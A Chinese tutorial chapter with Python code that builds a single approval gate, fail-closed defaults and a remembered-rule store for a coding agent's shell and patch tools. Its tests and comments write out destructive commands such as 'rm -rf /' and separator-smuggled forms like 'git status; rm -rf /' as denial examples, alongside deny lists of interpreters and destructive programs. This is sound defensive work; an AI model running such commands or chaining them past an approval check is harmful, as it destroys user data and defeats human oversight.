---

## §12 一扇门

现在能判断一条命令"是什么"、"该怎么办"了。接下来要把判断接到工具上：`run_shell` 和 `apply_patch` 执行前，先问一句。

### 12.1 为什么这里值得加一层

第 0 章列过"什么时候值得加一层抽象"，并且说过遇到新情况再补。这里就是一个新情况：

> **一条规则必须只在一个地方执行。**

"没经过审批的东西不许执行"是一条规则。如果每个工具自己检查，今天是两个工具两处检查，以后每加一个会动手的工具，
就得有人**记得**加上检查——而"记得"是最不可靠的机制。

第 0 章清单上原有的第二条也适用：命令字符串是模型的输出，**这里是它跨过信任边界的地方**。

所以新建 `src/minicodex/approval.py`，开头的 docstring 就叫"唯一的门"（The one door）。
这个模块做一件事：把 `policy.py` 的判断、后面要写的"记住的规则"，和一个真人接到一起，**而且只在这里接**。

### 12.2 "唯一"要靠删代码来实现

`shell.py` 末尾有一个从第 2 章就在的函数 `run_shell(session, args)`：它检查参数，然后**直接**调用 `ShellSession.run()`，
中间没有任何审批。

可以在它里面加一道检查。但那样就有**两条路**通到子进程，而没加检查的那条会一直在那里，等着以后某段代码找到它。所以：
**删掉它**，在原来的位置留一段注释说明为什么删：

```python
# The tool-callable wrapper used to live here, taking a `ShellSession` and an
# argument dict.  Chapter 5 moved it to `tools.py`, and the move is the point:
# that function reached `ShellSession.run()` without passing an approval gate,
# and leaving it in place would have left a second, shorter route to a
# subprocess for a future caller to find.  Deleting it is what makes
# "everything goes through the gate" a fact about the code rather than a
# convention.  `tests/test_approval.py` asserts it stays deleted.
```

同时 `shell.py` 顶部的 `from typing import Any` 没人用了，一起删掉（ruff 会提醒你）。

新的 `run_shell` 放进 `tools.py`（§12.4），并在 `tests/test_approval.py` 里加一个测试保证旧的不会回来——见 §13 末尾。

### 12.3 门本身

在 `approval.py` 里先写这几样东西：

```python
"""The one door.

`policy.py` says what a command is.  `rules.py` says what has already been
agreed.  This module is where they meet a human, and -- more importantly --
it is the *only* place any of that happens.

That single-entry-point property is the abstraction this chapter pays for.
Chapter 0 listed the cases where a layer earns its keep and said the list
would grow when a new case turned up; this is one.  "Nothing executes
unapproved" is a rule, and a rule that is not enforced in one place is a rule
that every call site maintains separately.  `run_shell` and `apply_patch` both
need it today; every tool added after this chapter will need it too, and the
way to make that automatic is to leave no second route to the subprocess.

One of chapter 0's original cases applies as well: the command string is
model output, and this is where it crosses a trust boundary.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from typing import Protocol

from minicodex.policy import (
    ApprovalPolicy,
    Decision,
    Risk,
    SandboxMode,
    judge_command,
    judge_write,
)
from minicodex.rules import RuleRefused, RuleStore, Scope, check_rule
from minicodex.shell_parse import segments
from minicodex.tool_errors import permission_error


@dataclass
class Session:
    """What this conversation is currently allowed to do.

    Mutable, and the only mutable thing in this module.  It has to be: the
    whole point of `request_permissions` is that the answer to "may I use the
    network" can be different at turn 9 than it was at turn 1.  Freezing it and
    rebuilding it would mean threading a new object back out through every
    tool handler, for no gain -- there is one of these per conversation and one
    conversation per process.

    `rules` and `approver` live here too rather than being passed alongside,
    because they have exactly the same lifetime and passing four things that
    always travel together is how you end up with a call site that forgets one.
    """

    mode: SandboxMode = "read-only"
    policy: ApprovalPolicy = "on-request"
    rules: RuleStore = field(default_factory=RuleStore)
    # Fails closed.  See `DenyAll`.
    approver: Approver = field(default_factory=lambda: DenyAll())

    def describe(self) -> str:
        return f"sandbox_mode={self.mode}, approval_policy={self.policy}"


@dataclass(frozen=True)
class ApprovalRequest:
    what: str
    reason: str
    risk: Risk
    # The prefix worth offering as a rule, or None when no rule may be made for
    # this command.  Computed before the prompt is drawn, so the prompt never
    # offers an option that would then be refused.
    suggested_rule: tuple[str, ...] | None


@dataclass(frozen=True)
class ApprovalReply:
    approved: bool
    # What the user actually agreed to run, which is not always what was asked.
    command: str
    remember: Scope | None = None


class Approver(Protocol):
    """Anything that can answer a yes/no about running something.

    A Protocol for the same reason `Model` is one: the tests need a
    deterministic implementation today, not hypothetically.  Structural typing
    means the test doubles below inherit nothing.
    """

    async def ask(self, request: ApprovalRequest) -> ApprovalReply: ...


@dataclass(frozen=True)
class GateResult:
    allowed: bool
    # The command to actually run.  Not the same string that came in when the
    # user edited it at the prompt.
    command: str
    # Set when the answer was no.  Written for the model, and deliberately not
    # shaped like an ordinary tool error -- see `tool_errors.permission_error`.
    denial: str | None = None
    # Set when the user changed the command.  Prepended to whatever the command
    # produced, because a model that is not told will report on the command it
    # asked for.
    note: str | None = None
```

> - **`Session`**：这次对话**当前**被允许做什么。这是整个模块里唯一可以修改的类（没有 `frozen=True`），
>   因为 §18 的 `request_permissions` 会在对话中途改变它。`rules` 和 `approver` 也放在这里，
>   理由写在 docstring 里：**总是一起出现的四样东西，分开传，迟早有一个调用点会漏传一个。**
> - **默认值**：`read-only` + `on-request` + 一个空的规则库 + `DenyAll`（下面马上写）。
>   `field(default_factory=...)` 是 dataclass 里"每次新建都造一个新对象"的写法——第 1 章讲过为什么可变的默认值不能直接写成 `= RuleStore()`。
>   `lambda: DenyAll()` 而不是直接写 `DenyAll`：`DenyAll` 定义在文件后面，`lambda` 让这个名字到真正用的时候才被查找。
> - **`ApprovalRequest`**：问人时给人看的东西——要做什么、为什么要问、风险，以及"如果同意，可以记住哪条规则"。
> - **`ApprovalReply`**：人的回答——同不同意、**实际同意执行的命令**（人可以改命令，§15）、要不要记住。
> - **`Approver`**：第 0 章 `Model` 用过的 `Protocol`。任何有 `async def ask(request)` 方法的对象都是 Approver，
>   测试里可以随手写一个。
> - **`GateResult`**：过门的结果。`denial` 是拒绝时给模型看的话，`note` 是人改了命令时要告诉模型的话。

然后是门：

```python
async def gate_command(command: str, session: Session) -> GateResult:
    verdict = judge_command(command, mode=session.mode, policy=session.policy)

    if verdict.decision is Decision.ALLOW:
        return GateResult(True, command)

    # Rules are consulted after the policy and before the human.  They can turn
    # a question into a yes; they can never turn a denial into a yes, because
    # `never` means there was nobody there to make the rule mean anything.
    parts = segments(command)
    if verdict.decision is Decision.ASK and parts is not None and session.rules.allows_every(parts):
        return GateResult(True, command)

    if verdict.decision is Decision.DENY:
        return GateResult(False, command, denial=_denial(command, verdict.reason, session))

    reply = await session.approver.ask(
        ApprovalRequest(
            what=command,
            reason=verdict.reason,
            risk=verdict.risk,
            suggested_rule=_suggested_rule(command),
        )
    )
    if not reply.approved:
        return GateResult(False, command, denial=_denial(command, "the user declined", session))

    if reply.remember is not None:
        # The rule is made from what the user *agreed to*, not from what the
        # model asked for.  Editing the command and choosing "always" otherwise
        # remembers the version that was rejected.
        remembered = _suggested_rule(reply.command)
        if remembered is not None:
            session.rules.remember(remembered, scope=reply.remember, prompted_by=reply.command)

    note = None
    if reply.command != command:
        note = (
            f"Note: the user changed your command before running it. "
            f"You asked for: {command!r}. What actually ran: {reply.command!r}. "
            "The output below is from the command that ran."
        )
    return GateResult(True, reply.command, note=note)


async def gate_write(describe: str, session: Session) -> GateResult:
    verdict = judge_write(mode=session.mode, policy=session.policy)
    if verdict.decision is Decision.ALLOW:
        return GateResult(True, describe)
    if verdict.decision is Decision.DENY:
        return GateResult(False, describe, denial=_denial(describe, verdict.reason, session))

    reply = await session.approver.ask(
        ApprovalRequest(
            what=describe, reason=verdict.reason, risk=verdict.risk, suggested_rule=None
        )
    )
    if not reply.approved:
        return GateResult(False, describe, denial=_denial(describe, "the user declined", session))
    return GateResult(True, describe)
```

> - **`gate_command`** 的顺序：先问 `judge_command`；放行就直接放行。
>   不是放行时，**先查记住的规则**（§14），规则能把"问"变成"放行"，但**永远不能把"拒绝"变成"放行"**——
>   `never` 的意思是没有人在，没人在的时候定下的规则不算数。
>   然后，拒绝就返回拒绝消息；剩下的就是"问"：调用 `session.approver.ask(...)`。
>   人不同意，返回拒绝消息；人同意了，可能要记住一条规则（§14），可能改了命令（§15）。
> - **`gate_write`**：`apply_patch` 的门，结构一样但更简单：不需要分段，不提供"记住"（`suggested_rule=None`）。
>   给人看的 `describe` 是 `"edit files in <仓库名>/"`。

`_suggested_rule` 和 `_denial` 这两个辅助函数分别在 §14 和 §16 讲。现在先写两个最简单的 Approver：

```python
class DenyAll:
    """The default, and the reason there is a default at all.

    An `Agent` constructed without an approver must not be an `Agent` that runs
    everything.  Failing closed makes a forgotten wire-up show up as a task
    that cannot act, which somebody notices, rather than as a sandbox that is
    not there, which nobody does.
    """

    async def ask(self, request: ApprovalRequest) -> ApprovalReply:
        return ApprovalReply(False, request.what)


class AllowAll:
    """For tests that are about something else, and for `--yes`."""

    async def ask(self, request: ApprovalRequest) -> ApprovalReply:
        return ApprovalReply(True, request.what)
```

> **`DenyAll` 是默认值，而且 docstring 说了为什么必须是它**：一个没接好审批的 Agent，必须是一个"什么都做不了"的 Agent，
> 而不是一个"什么都做"的 Agent。前一种会有人发现（任务完不成）；后一种没人发现（沙箱根本不存在）。
> **这叫"失败关闭"（fail closed）：出了差错时，停在安全的那一边。**

### 12.4 接到工具上

`tools.py` 改四处。第一，`ToolContext` 多一个字段：

```python
@dataclass(frozen=True)
class ToolContext:
    """Everything a handler needs that belongs to one conversation.

    `root` and `shell` already existed as loose arguments threaded through
    `functools.partial`; this only gave them a name.  `root` decides whether a
    path is inside the repository, `shell` carries the working directory across
    calls.  Neither belongs to the process, which is why neither is a
    module-level constant.

    `session` arrived in chapter 5 and is the odd one out: it is mutable, and
    it is mutable because `request_permissions` can change what the rest of the
    conversation is allowed to do.  It sits here rather than being a fourth
    argument to every handler for the same reason the other two do.
    """

    root: Path
    shell: ShellSession
    session: Session
```

第二，新的 `run_shell`，门在它里面：

```python
async def run_shell(ctx: ToolContext, args: dict[str, Any]) -> str:
    """Run a shell command, if the gate lets it through.

    The only thing above the gate is the type check, and all it can do is
    return an error message.  Everything that can reach a subprocess sits below
    `gate_command`; keep it that way, because anything that runs before the gate
    is a way around it.
    """
    command = args.get("command")
    if not isinstance(command, str):
        return tool_error(
            'run_shell needs a "command" argument, a string',
            you_sent=repr(args.get("command")),
            do_this='Example: {"command": "pytest -q"}',
        )

    gated = await gate_command(command, ctx.session)
    if not gated.allowed:
        assert gated.denial is not None
        return gated.denial

    output = await ctx.shell.run(gated.command)
    # The user may have run something else entirely.  A model that is not told
    # will read this output as the result of the command it asked for and
    # report accordingly -- which is a wrong answer produced by a mechanism
    # that was working correctly.
    return f"{gated.note}\n\n{output}" if gated.note else output
```

> - 门上面只有一个参数类型检查，它能做的只是返回一条错误消息，碰不到子进程。
>   docstring 写明了规矩：**能碰到子进程的东西，都要放在 `gate_command` 下面。**
> - `assert gated.denial is not None`：告诉读者（和类型检查器）"不允许时一定有拒绝消息"。
> - 执行的是 `gated.command` 而不是 `command`——人可能改过（§15）。改过的话，`note` 贴在输出前面。
> - `f"{a}\n\n{b}" if 条件 else b`：Python 的条件表达式，"条件成立取前者，否则取后者"。

第三，`apply_patch` 多一个 `session` 参数，门放在第一件事：

```python
    gated = await gate_write(f"edit files in {root.name}/", session)
    if not gated.allowed:
        assert gated.denial is not None
        return gated.denial
```

第四，`tool_specs()` 里两个 `bind` 改成把 `ctx`（或 `ctx.session`）传进去，`default_tools` 多一个 `session` 参数：

```python
            bind=lambda ctx: functools.partial(apply_patch, ctx.root, ctx.session),
            ...
            bind=lambda ctx: functools.partial(run_shell, ctx),
```

```python
def default_tools(root: Path | None = None, session: Session | None = None) -> dict[str, ToolFn]:
    """Bind every spec to one repository, one shell session and one permission set.

    A fresh `ShellSession` per call, because its state (cwd, env) belongs to
    one conversation and not to the process.  A fresh `Session` for the same
    reason -- and its default is the restrictive one, so a caller that forgets
    to pass permissions gets an agent that can read and nothing else.
    """
    context = ToolContext(
        root=(root or Path.cwd()).resolve(),
        shell=ShellSession(),
        session=session or Session(),
    )
    return {spec.name: spec.bind(context) for spec in tool_specs()}
```

> `session or Session()`：没传就用默认的——也就是 `read-only` + `DenyAll`。**忘了传参的调用者，拿到的是最保守的那个。**

还有 `import` 那一行：删掉 `from minicodex.shell import run_shell as _run_shell`，加上
`from minicodex.approval import ...`（完整的 `tools.py` 在 §18.3）。

`apply_patch` 和 `run_shell` 两个工具都过门，"每个会动手的工具都过门"要测的是**整体性质，不是个例**：

```python
# ---------------------------------------------------------------------------
# The gate is the only door
# ---------------------------------------------------------------------------


def test_F05_00_the_shell_has_no_ungated_entry_point() -> None:
    """`shell.run_shell` used to take a session and an argument dict and call
    `ShellSession.run()` with no approval anywhere. It was deleted rather than
    left as a shortcut for a future caller to find."""
    import minicodex.shell as shell

    assert not hasattr(shell, "run_shell")


async def test_F05_00_every_tool_that_acts_goes_through_the_gate(tmp_path: Path) -> None:
    """Both acting tools, denied, with nothing to show for it.

    A per-tool test would pass just as well with one of them wired up and the
    other forgotten. This asserts the property over the table, so a tool added
    in chapter 8 that forgets the gate turns this red.
    """
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
    tools = default_tools(tmp_path, Session(mode="read-only", approver=DenyAll()))

    out = await tools["run_shell"]({"command": "rm -rf /"})
    assert out.startswith(PERMISSION_PREFIX)

    out = await tools["apply_patch"](
        {"edits": [{"path": "a.py", "old_text": "x = 1", "new_text": "x = 2"}]}
    )
    assert out.startswith(PERMISSION_PREFIX)
    assert (tmp_path / "a.py").read_text(encoding="utf-8") == "x = 1\n"


async def test_F05_00_reading_never_needs_approval(tmp_path: Path) -> None:
    """The other half: a sandbox that blocks reading blocks the agent from
    working at all, and the user turns it off."""
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
    tools = default_tools(tmp_path, Session(mode="read-only", approver=DenyAll()))
    assert await tools["read_file"]({"path": "a.py"}) == "x = 1\n"


```

> - **第一个**：`shell` 模块里不再有 `run_shell`。`hasattr(对象, "名字")`：对象有没有这个属性。
> - **第二个**：从 `default_tools(...)` 拿到的**全部**工具表里取出两个会动手的工具，都在 `DenyAll` 下调用一次，
>   输出都以 `Permission denied:` 开头，而且文件没被改。docstring 说了为什么不按工具分开测：
>   分开测的话，一个工具接好、另一个忘了接，两个测试也能各自通过。
> - **第三个**：另一半——读文件永远不需要审批。一个连"读"都拦的沙箱，会让 Agent 什么都干不了，用户只好把它关掉。

---

## §13 意外：插曲 A 的测试红了

门接好，跑全量。下面这段输出是真实跑出来的（在接上门、但还没加 §18 那个新工具的时间点）：

```
FAILED tests/test_characterization.py::test_FA_02_a_whole_run_is_pinned_message_by_message
FAILED tests/test_shell.py::test_run_shell_wrapper_rejects_a_missing_command
2 failed, 123 passed, 7 skipped in 11.08s
```

第二个好理解：

```
E       ImportError: cannot import name 'run_shell' from 'minicodex.shell'
tests\test_shell.py:343: ImportError
```

这是 §12.2 那次删除**自己来报到了**。

第一个更有意思。插曲 A 写的那个"整轮对话逐条钉死"的测试：

```
E         - ontent": "Applied 1 edit(s) to a.py."
E         + ontent": "Permission denied: that was not run, because the user declined You sent: edit files in test_FA_02_a_whole_run_is_pinn0/ This is a permissi
```

那个测试调用的是 `default_tools(tmp_path)`，没传 session，于是拿到默认的 `Session()`——`read-only` + `DenyAll`——
**`apply_patch` 被拒绝了。**

> §12.3 那段"失败关闭"的 docstring，在这里从一句声明变成了一个事实。
> **一个默认值是不是真的保守，只有在有人忘了传参的时候才知道**——而这个测试就是那个忘了传参的人。

### 13.1 红了之后，有两种修法

插曲 A 立的规矩是：**纯重构，行为零变化**。这一章不是重构，是加功能，行为**应该**变。那是不是把快照文件重新生成一遍就行了？

不行。那样会同时丢掉两样东西：一是这个快照从插曲 A 到现在一直可比的历史；二是"默认值是保守的"这个刚刚被证明的事实。

所以做两个动作。**第一，给那个测试一个明确宽松的 session，快照一个字节都不改：**

```python
async def test_FA_02_a_whole_run_is_pinned_message_by_message(tmp_path: Path) -> None:
    """Every request body the loop produces across a three-turn run.

    This is the artefact the refactor is measured against.  It covers, in one
    run, the things the loop is responsible for: several calls in one turn,
    one result per call in the order the calls were made, a tool that fails,
    the turn-budget note appearing at the right moment, and stopping on a turn
    that has prose and no calls.

    `run_shell` is deliberately not exercised: it spawns a POSIX shell, and a
    transcript that only pins on one platform pins nothing on the other.

    Chapter 5 note.  This test went red the moment the approval gate was wired
    in, and it was right to: `default_tools(tmp_path)` builds a default
    `Session`, the default is `read-only` with `DenyAll`, and `apply_patch` was
    refused.  That is the fail-closed default working, and it is pinned by
    `test_F05_00_the_default_session_can_read_and_nothing_else` below.

    Here the session is made explicitly permissive so this transcript keeps
    measuring the thing it was written to measure -- the loop -- and it still
    matches interlude A's fixture byte for byte.  Adding a feature is allowed
    to change behaviour; it is not allowed to change behaviour *quietly*, and
    the difference between the two is whether a red test got a new fixture or
    a new argument.
    """
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")

    model = ScriptedModel(
        [
            [
                _call("call_a1", 0, "read_file", path="a.py"),
                _call("call_a2", 1, "read_file", path="missing.py"),
            ],
            [
                _call(
                    "call_b1",
                    0,
                    "apply_patch",
                    edits=[{"path": "a.py", "old_text": "x = 1", "new_text": "x = 2"}],
                )
            ],
            "Changed x to 2.",
        ]
    )

    tools = default_tools(tmp_path, Session(mode="workspace-write", approver=AllowAll()))
    result = await Agent(model, tools, max_turns=4).run("change x to 2 in a.py")

    actual = {
        "requests": model.sent,
        "final_text": result.final_text,
        "stop_reason": result.stop_reason,
        "turns_used": result.turns_used,
        "file_after": (tmp_path / "a.py").read_text(encoding="utf-8"),
    }
    expected = (FIXTURES / "golden_transcript.json").read_text(encoding="utf-8")
    assert _canonical(actual) == expected
```

> docstring 末尾新加的一段（"Chapter 5 note"）记下了为什么这么改。改完它又绿了，**而且对比的还是插曲 A 那天记下的快照文件**——
> 这证明这一章的所有改动都**没有动 Agent 的循环本身**。别忘了文件开头加上 `from minicodex.approval import AllowAll, Session`。

**第二，把新行为写成它自己的测试**，放在同一个文件末尾：

```python
async def test_F05_00_the_default_session_can_read_and_nothing_else(tmp_path: Path) -> None:
    """The same run with the default session, which is the one a caller gets
    by forgetting to pass anything.

    A fail-closed default is only a claim until something runs without one.
    This is that something: identical script, no `Session` argument, and the
    edit does not land.
    """
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")

    model = ScriptedModel(
        [
            [
                _call(
                    "call_b1",
                    0,
                    "apply_patch",
                    edits=[{"path": "a.py", "old_text": "x = 1", "new_text": "x = 2"}],
                )
            ],
            "I could not change it.",
        ]
    )

    await Agent(model, default_tools(tmp_path), max_turns=4).run("change x to 2 in a.py")

    assert (tmp_path / "a.py").read_text(encoding="utf-8") == "x = 1\n"
    answered = model.sent[1][-1]["content"]
    assert answered.startswith("Permission denied:"), answered
```

> 同样的脚本，**不传** session：文件没被改，模型第二次请求里最后一条消息（工具的回答）以 `Permission denied:` 开头。
> `model.sent[1][-1]["content"]`：模型收到的第 2 次请求（下标 1）里，最后一条消息的内容。

> **一个红了的快照测试，改快照和改参数是两件完全不同的事。**
> 改快照说的是"行为变了，新的才对"；改参数说的是"行为没变，这个测试测的本来就不是新功能"。
> 分不清这两者，快照测试就会退化成"红了就重新生成"的仪式。

`test_shell.py` 里那个测试搬到新位置，docstring 记下搬家的理由（文件开头加 `from pathlib import Path`）：

```python
async def test_run_shell_wrapper_rejects_a_missing_command(tmp_path: Path) -> None:
    """The wrapper moved to `tools.py` in chapter 5, and the move is the test.

    It used to live in `shell.py` and reach `ShellSession.run()` without
    passing an approval gate. This import going red was the change announcing
    itself; `test_F05_00_the_shell_has_no_ungated_entry_point` in
    tests/test_approval.py is what keeps it announced.
    """
    from minicodex.approval import AllowAll, Session
    from minicodex.tools import ToolContext, run_shell

    ctx = ToolContext(
        root=tmp_path,
        shell=ShellSession(),
        session=Session(mode="full-access", approver=AllowAll()),
    )
    out = await run_shell(ctx, {})
    assert "needs a" in out
```

提交：

```bash
git add src/minicodex/approval.py src/minicodex/tools.py src/minicodex/shell.py tests/
git commit -m "feat: one gate in front of run_shell and apply_patch"
```

---

## §14 F05-06：审批疲劳，和解药自带的毒

F05-06 说的是：**每条都问，用户烦了，一路点"是"。**

这条故障有个特别之处：**它是人的故障，不是模型的**，没法用模型直接测。能测的是造成它的输入量：跑一个普通的小任务，
把模型发出的每条命令都放到 `read-only` + `on-request` 下判断一遍，数会问几次。

下面是这一章原始写作时的实测记录（两个模型各跑三次；探针脚本没有收进仓库，结果记在 `FAULTS.md` 里）：

```
  gemma4:31b-cloud
    1: 4 command(s), 3 would prompt, 3 distinct
         ASK   pytest
         ALLOW ls -R
         ASK   find . -maxdepth 2 -not -path '*/.*'
         ASK   find . -name "test*.py"
    2: 4 command(s), 2 would prompt, 2 distinct
    3: 4 command(s), 2 would prompt, 2 distinct

  gpt-4o-mini
    1: 2 command(s), 2 would prompt, 2 distinct
         ASK   sed -i 's/return text.strip().lower()/return text.strip()/g'
         ASK   pytest
    2: 4 command(s), 4 would prompt, 4 distinct
    3: 2 command(s), 2 would prompt, 2 distinct
```

一个几步的小任务，问 2～4 次。第 0 章定的轮次上限是 12 轮——**一个跑满上限的会话，问二三十次是常态。**没有人会认真读第二十次。

**F05-06 成立。** 顺便注意 `find . -name "test*.py"`：它要问，是因为 `*` 不在 `_MODELLED` 里——§7.1 说的那个代价，账单就在这里。

### 14.1 解药：记住。和它自带的毒

解药是"记住这次同意"。但一条记住的规则，是**一个在所有人都忘了它之后还在生效的决定**。所以它必须带三样东西。
新建 `src/minicodex/rules.py`：

```python
"""Approvals the user does not have to give twice.

A prompt on every command is a prompt nobody reads.  The failure mode is not
that the user gets annoyed; it is that after the fifteenth `pytest -q` they
stop reading the command and start reading the shape of the prompt, and the
sixteenth one -- the one that was different -- gets the same reflex `y`.  An
approval mechanism that is answered reflexively has the same security value as
no approval mechanism, and costs more.

So an approval can be remembered.  Which immediately creates the opposite
problem, and it is worse: a remembered rule is a decision that keeps applying
long after everyone has forgotten making it.  Three things keep that honest.

**Scope.**  `session` dies with the process.  `project` is written to disk and
survives, and is offered second, because the cost of a too-broad rule scales
with how long it lives.

**Attribution.**  Every rule records when it was created and which command
produced it.  "Why is `cargo test` allowed?" has an answer.

**A refusal to write the dangerous ones.**  `remember()` rejects rules that
would hand over more than the command that prompted them -- an interpreter, a
destructive command, or a bare tool name that covers all of its subcommands.
codex's prompt gives the model the same list from the other side, under the
heading "Banned prefix_rules": not `["python3"]`, not `["python", "-"]`, and
"NEVER provide a prefix_rule argument for destructive commands like rm".
"""

from __future__ import annotations

import json
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Literal

from minicodex.policy import INTERPRETERS, NETWORK, WRITES

Scope = Literal["session", "project"]

# Programs whose risk is decided by the word after them.  A rule naming only
# the program hands over every subcommand it has, including the ones added in
# next year's release: `("git",)` covers `git push --force`, `("npm",)` covers
# `npm publish`.
#
# The first version of this refused *every* one-word rule unless the program
# was on the read-only list, which was tidier and wrong.  It made `("pytest",)`
# impossible, and `pytest` is the single most common thing a developer gets
# asked about -- so the mechanism built to end approval fatigue could not be
# applied to the command that causes it.
#
# `("pytest",)` is allowed, and it is a real grant: pytest runs whatever is in
# `conftest.py` and takes flags this project has never seen.  There is no way
# to make that decision safely on the user's behalf, which is the reason a rule
# records who made it and when, and why `minicodex forget` exists.
SUBCOMMAND_TOOLS = NETWORK | {"git"}

DEFAULT_RULES_PATH = Path(".minicodex") / "rules.json"


class RuleRefused(ValueError):
    """`remember()` would have stored a rule broader than the command it came from."""


@dataclass(frozen=True)
class Rule:
    """A prefix that auto-approves any segment starting with these words.

    Words, not a string.  A string prefix is the fault this chapter opens with:
    `"git status"` is a prefix of `"git status; rm -rf /"`.  Words are matched
    against a segment that the parser has already split, so there is nothing
    left in the segment for a separator to hide in.
    """

    words: tuple[str, ...]
    scope: Scope
    # Why it exists, kept verbatim.  A rule with no story behind it is a rule
    # nobody can decide whether to revoke.
    prompted_by: str
    created_at: str

    def matches(self, segment: list[str]) -> bool:
        return tuple(segment[: len(self.words)]) == self.words

    def describe(self) -> str:
        return (
            f"{' '.join(self.words)}  [{self.scope}, added {self.created_at} "
            f"for: {self.prompted_by}]"
        )

    def to_json(self) -> dict[str, object]:
        return {
            "words": list(self.words),
            "scope": self.scope,
            "prompted_by": self.prompted_by,
            "created_at": self.created_at,
        }


def check_rule(words: tuple[str, ...]) -> None:
    """Raise `RuleRefused` if this prefix would give away more than one command.

    Separate from `remember()` so the approval prompt can decide *before*
    offering "always" whether that option is even on the table.  Offering a
    choice and then refusing it is how you teach someone to ignore the refusal.
    """
    if not words:
        raise RuleRefused("an empty rule matches every command")

    name = words[0].rsplit("/", 1)[-1]
    if name in INTERPRETERS:
        raise RuleRefused(
            f"{name!r} takes a program as an argument, so a rule for it approves "
            "every program that will ever be passed to it"
        )
    if name in WRITES:
        raise RuleRefused(
            f"{name!r} destroys things, and the arguments are where the damage lives; "
            "approve each one"
        )
    if len(words) == 1 and name in SUBCOMMAND_TOOLS:
        raise RuleRefused(
            f"a one-word rule for {name!r} covers every subcommand it has, "
            "including the ones you have not seen yet -- name the subcommand too"
        )


class RuleStore:
    """Session rules in memory, project rules on disk.

    Loading is best-effort in the same sense the recorder is: a rules file that
    someone hand-edited into invalid JSON must not stop the agent from
    starting.  It must not silently grant anything either, so the failure mode
    is an empty store -- every command asks -- and not a partial one.
    """

    def __init__(self, path: Path | None = None) -> None:
        self.path = path
        self._rules: list[Rule] = []
        if path is not None and path.exists():
            self._rules.extend(_load(path))

    def __len__(self) -> int:
        return len(self._rules)

    def all(self) -> list[Rule]:
        return list(self._rules)

    def allows(self, segment: list[str]) -> Rule | None:
        return next((rule for rule in self._rules if rule.matches(segment)), None)

    def allows_every(self, segments: list[list[str]]) -> bool:
        """Every segment, not any segment.

        `git status | rm -rf /` has a segment covered by a `git status` rule
        and one that is not.  Approving on `any` would auto-run the second.
        """
        return bool(segments) and all(self.allows(segment) for segment in segments)

    def remember(self, words: tuple[str, ...], *, scope: Scope, prompted_by: str) -> Rule:
        check_rule(words)
        rule = Rule(
            words=words,
            scope=scope,
            prompted_by=prompted_by,
            created_at=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        )
        self._rules.append(rule)
        if scope == "project":
            self._save()
        return rule

    def forget(self, index: int) -> Rule:
        """Revoke by the number `minicodex rules` printed.

        Revocation is not a nicety.  A rule that can only be removed by finding
        and editing a JSON file is a rule that stays.
        """
        rule = self._rules.pop(index)
        if rule.scope == "project":
            self._save()
        return rule

    def _save(self) -> None:
        if self.path is None:
            return
        self.path.parent.mkdir(parents=True, exist_ok=True)
        kept = [rule.to_json() for rule in self._rules if rule.scope == "project"]
        self.path.write_text(json.dumps(kept, indent=2) + "\n", encoding="utf-8")


def _load(path: Path) -> list[Rule]:
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    if not isinstance(raw, list):
        return []

    rules: list[Rule] = []
    for item in raw:
        if not isinstance(item, dict) or not isinstance(item.get("words"), list):
            continue
        words = tuple(str(word) for word in item["words"])
        try:
            # A rule that would be refused today is refused on load too.  The
            # file is writable by whoever owns the machine, and "it was already
            # in the file" is not a reason to honour `["python3"]`.
            check_rule(words)
        except RuleRefused:
            continue
        rules.append(
            Rule(
                words=words,
                scope="project",
                prompted_by=str(item.get("prompted_by", "(unrecorded)")),
                created_at=str(item.get("created_at", "(unrecorded)")),
            )
        )
    return rules
```

逐段看。

> **开头的 docstring** 把问题说得很清楚：问得太多，人就不看内容、只看形状，第十六次那条"不一样的"也会得到同一个反射性的 `y`。
> 一个被反射性回答的审批机制，安全价值等于没有，成本还更高。

> **`Rule`——三样东西缺一不可：**
>
> 1. **`words` 是词的元组，不是字符串。** 这一章开头的教训直接适用：`"git status"` 是 `"git status; rm -rf /"` 的前缀。
>    规则拿去比对的，是分段器已经切好的某一段的词，里面没有地方藏分隔符。
>    `matches(segment)`：这一段的前 N 个词，是不是正好等于规则的 N 个词。
> 2. **`scope` 作用域。** `session` 随进程结束消失；`project` 写到磁盘，下次还在。
>    问人时 `session` 排在前面——**规则活得越久，写错的代价越大。**
> 3. **`prompted_by` 和 `created_at`：来源。**"为什么 `cargo test` 是允许的？"这个问题必须有答案。
>    `describe()` 把它们拼成一行给人看；`to_json()` 变成可以写进文件的字典。

> **`check_rule(words)`：有些规则根本不该被创建。** 这是对付 F05-07（"规则太宽"）最有效的办法——**不让它出生**。三条拒绝：
>
> - 空规则：匹配一切。
> - **解释器**（`python3 ...`）：它的参数是一个程序，给它一条规则，等于批准了以后传给它的每一个程序。
> - **会写的命令**（`rm ...`）：危险全在参数里，每次都得单独批。
> - **只有一个词、而且是"看子命令定风险"的程序**（`git`、`npm`……）：`("git",)` 覆盖了 `git push --force`。
>   `SUBCOMMAND_TOOLS = NETWORK | {"git"}`：`|` 对两个集合是"并集"。
>
> 它和 `remember()` 分开，是为了让审批界面在**提供"永远允许"这个选项之前**就知道这个选项能不能给。
> **先给一个选项再拒绝它，等于在教人忽略拒绝。**

> **`SUBCOMMAND_TOOLS` 上面那段长注释记下了一次写错**：第一版的规则是"除非程序在只读名单上，否则一律不许单词规则"。
> 看起来更严、更整齐。结果 `("pytest",)` 被拒——而 `pytest` 正是上面那组数据里**问得最多的那条**。
> **为了解决审批疲劳而造的机制，用不到造成审批疲劳的那条命令上。**
> 改成"这个程序的风险是不是由下一个词决定"。注释最后一段说得很坦白：`("pytest",)` 是一个**真的**放行——
> pytest 会执行 `conftest.py` 里的任何东西。这个决定没法替用户安全地做，所以规则要记录来源、要能撤销。

> **`RuleStore`**：会话规则在内存里，项目规则在磁盘上（`.minicodex/rules.json`，第 0 章已经把 `.minicodex/` 放进了 `.gitignore`）。
>
> - `__len__`：定义了它，`len(store)` 就能用。
> - `allows(segment)`：第一条能匹配这一段的规则，没有就是 `None`。
> - **`allows_every(segments)`：每一段都要有规则覆盖，不是任意一段。** `git status | rm -rf /` 有一段被 `git status` 规则覆盖，
